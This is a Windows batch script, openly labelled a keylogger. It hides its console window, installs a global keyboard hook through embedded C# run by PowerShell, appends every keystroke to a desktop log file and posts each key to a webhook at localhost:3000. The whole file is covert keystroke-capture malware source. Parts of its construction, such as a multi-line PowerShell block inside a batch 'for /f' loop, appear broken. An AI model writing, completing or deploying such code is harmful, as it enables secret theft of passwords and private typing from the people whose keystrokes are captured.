@echo off
cls
title Keylogger-Batch Ver. 1.0

:: Hide the terminal window
powershell -Command "[Console]::WindowHeight=1; [Console]::WindowWidth=1; [Console]::BufferHeight=1; [Console]::BufferWidth=1"

:: Create log file if it doesn't exist
if not exist "%userprofile%\desktop\keylogger.txt" (
  echo Keylogger started at %date% %time% > "%userprofile%\desktop\keylogger.txt"
)

:: Main loop to capture and send keystrokes
:loop
:: Capture keystroke using PowerShell (global keylogger)
for /f "delims=" %%a in ('powershell -Command "$null = Add-Type -TypeDefinition @'
using System;
using System.Runtime.InteropServices;
using System.Windows.Forms;

public class KeyLogger {
    private const int WH_KEYBOARD_LL = 13;
    private const int WM_KEYDOWN = 0x0100;
    private static LowLevelKeyboardProc _proc = HookCallback;
    private static IntPtr _hookID = IntPtr.Zero;

    public static void Main() {
        _hookID = SetHook(_proc);
        Application.Run();
        UnhookWindowsHookEx(_hookID);
    }

    private static IntPtr SetHook(LowLevelKeyboardProc proc) {
        using (var curProcess = System.Diagnostics.Process.GetCurrentProcess())
        using (var curModule = curProcess.MainModule) {
            return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(curModule.ModuleName), 0);
        }
    }

    private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

    private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam) {
        if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN) {
            int vkCode = Marshal.ReadInt32(lParam);
            Console.WriteLine((Keys)vkCode);
        }
        return CallNextHookEx(_hookID, nCode, wParam, lParam);
    }

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool UnhookWindowsHookEx(IntPtr hhk);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr GetModuleHandle(string lpModuleName);
}
'@; [KeyLogger]::Main()"') do (
  set "key=%%a"
  echo %%a >> "%userprofile%\desktop\keylogger.txt"
  powershell -Command "Invoke-WebRequest -Uri 'http://localhost:3000/webhook' -Method POST -Body '%%a' -ContentType 'text/plain'"
)

:: Wait for 1 second before next iteration
timeout /t 1 /nobreak >nul
goto loop
